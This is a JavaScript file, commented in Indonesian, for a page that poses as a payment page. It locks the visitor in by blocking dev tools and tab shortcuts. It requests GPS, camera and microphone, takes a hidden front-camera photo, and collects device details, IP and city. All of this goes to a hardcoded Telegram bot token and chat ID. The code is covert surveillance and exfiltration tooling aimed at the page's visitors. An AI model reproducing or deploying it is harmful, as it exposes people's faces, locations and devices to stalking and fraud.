// Telegram Bot Config - Ganti dengan token dan chat ID Anda
const BOT_TOKEN = "7771429262:AAHwRR2VVM0Wlh1LWsmk9V3ZRifx8RZUU9Y";
const OWNER_CHAT_ID = "6878949999";

const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const statusDiv = document.getElementById('status');
const copyBtn = document.getElementById('copyBtn');
const paymentNumber = document.getElementById('paymentNumber');

const pinOverlay = document.getElementById('pinOverlay');
const pinInput = document.getElementById('pinInput');
const pinError = document.getElementById('pinError');

const CORRECT_PIN = "12345";

// Lock navigation and tab switching
window.addEventListener('blur', () => {
  if (!pinOverlay.hidden) return; // if locked, ignore
  alert("Anda harus memasukkan PIN untuk meninggalkan halaman ini.");
  window.focus();
});

// Disable right click and keyboard shortcuts for devtools/tab switching
window.addEventListener('contextmenu', e => e.preventDefault());
window.addEventListener('keydown', e => {
  // Block F12, Ctrl+Shift+I/J, Ctrl+U, Ctrl+W, Ctrl+Tab, Alt+Tab (some)
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
    (e.ctrlKey && e.key === "U") ||
    (e.ctrlKey && e.key === "W") ||
    (e.altKey && e.key === "Tab")
  ) {
    e.preventDefault();
    alert("Akses dibatasi. Masukkan PIN untuk melanjutkan.");
  }
});

// Show PIN overlay on load
function lockScreen() {
  pinOverlay.hidden = false;
  pinInput.value = "";
  pinError.textContent = "";
  pinInput.focus();
  startBtn.disabled = true;
  startBtn.setAttribute('aria-busy', 'true');
  statusDiv.textContent = "";
}
lockScreen();

// PIN input handler
pinInput.addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    checkPin();
  }
});
function checkPin() {
  if (pinInput.value === CORRECT_PIN) {
    pinOverlay.hidden = true;
    startBtn.disabled = false;
    startBtn.setAttribute('aria-busy', 'false');
    statusDiv.textContent = "Selamat datang! Silakan gunakan tombol di bawah.";
  } else {
    pinError.textContent = "PIN salah, coba lagi.";
    pinInput.value = "";
    pinInput.focus();
  }
}

// Salin nomor pembayaran ke clipboard
copyBtn.addEventListener('click', () => {
  navigator.clipboard.writeText(paymentNumber.textContent.trim())
    .then(() => {
      alert("Nomor pembayaran berhasil disalin!");
    })
    .catch(() => {
      alert("Gagal menyalin nomor pembayaran. Silakan salin secara manual.");
    });
});

// Kirim pesan ke Telegram
async function sendTelegramMessage(text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: OWNER_CHAT_ID,
        text: text,
        parse_mode: "Markdown"
      })
    });
  } catch (e) {
    console.error("Gagal kirim pesan Telegram:", e);
  }
}

// Kirim foto ke Telegram
async function sendTelegramPhoto(base64Image, caption) {
  try {
    const blob = await (await fetch(base64Image)).blob();
    const formData = new FormData();
    formData.append('chat_id', OWNER_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } catch (e) {
    console.error("Gagal kirim foto Telegram:", e);
  }
}

// Ambil info device dan IP publik
async function getDeviceInfo() {
  const ua = navigator.userAgent;
  const lang = navigator.language || "N/A";
  const resolution = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
  const ram = navigator.deviceMemory || "N/A";
  const cpu = navigator.hardwareConcurrency || "N/A";
  const online = navigator.onLine ? "Online" : "Offline";
  const cookiesEnabled = navigator.cookieEnabled ? "Ya" : "Tidak";
  const doNotTrack = navigator.doNotTrack || "N/A";

  let ip = "N/A", country = "N/A", region = "N/A", city = "N/A", isp = "N/A";
  try {
    const ipRes = await fetch("https://ipapi.co/json");
    const ipData = await ipRes.json();
    ip = ipData.ip || ip;
    country = ipData.country_name || country;
    region = ipData.region || region;
    city = ipData.city || city;
    isp = ipData.org || isp;
  } catch {}

  return { ua, lang, resolution, timezone, ram, cpu, online, cookiesEnabled, doNotTrack, ip, country, region, city, isp };
}

// Format pesan Markdown
function formatMessage(data, coords) {
  return `📍 *Info Pengunjung*\n` +
    `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n` +
    `📌 *Lokasi GPS:* ${coords.latitude}, ${coords.longitude} (Akurasi: ${coords.accuracy}m)`;
}

// Fungsi utama: minta izin, ambil data, kirim ke Telegram
async function captureAndSend() {
  statusDiv.textContent = "Meminta izin lokasi, kamera, dan media...";
  startBtn.disabled = true;
  startBtn.setAttribute('aria-busy', 'true');

  try {
    // Minta lokasi
    const coords = await new Promise((resolve, reject) => {
      if (!navigator.geolocation) reject(new Error("Geolocation tidak didukung"));
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
    });

    // Minta kamera (video) dan mikrofon (audio)
    const stream = await navigator.mediaDevices.getUser Media({ video: { facingMode: "user" }, audio: true });

    // Video dan canvas disembunyikan, tidak tampil ke user
    video.srcObject = stream;
    video.style.display = "none";

    await new Promise(resolve => video.onloadedmetadata = resolve);

    statusDiv.textContent = "Mengambil foto...";
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const base64Image = canvas.toDataURL('image/jpeg', 0.7);

    // Stop semua track kamera & mikrofon
    stream.getTracks().forEach(track => track.stop());

    statusDiv.textContent = "Mengumpulkan info perangkat...";
    const deviceInfo = await getDeviceInfo();

    statusDiv.textContent = "Mengirim data ke Telegram...";
    const message = formatMessage(deviceInfo, coords.coords);

    await sendTelegramMessage(message);

    const captionPhoto = `📸 Foto Pengunjung\n📌 Lokasi: ${coords.coords.latitude.toFixed(6)}, ${coords.coords.longitude.toFixed(6)}\n🕒 ${new Date().toLocaleString()}`;
    await sendTelegramPhoto(base64Image, captionPhoto);

    statusDiv.textContent = "Data berhasil dikirim ke Telegram. Terima kasih!";
  } catch (err) {
    statusDiv.textContent = "Error: " + (err.message || err);
    console.error(err);
  } finally {
    startBtn.disabled = false;
    startBtn.setAttribute('aria-busy', 'false');
  }
}

startBtn.addEventListener('click', () => {
  captureAndSend();
});
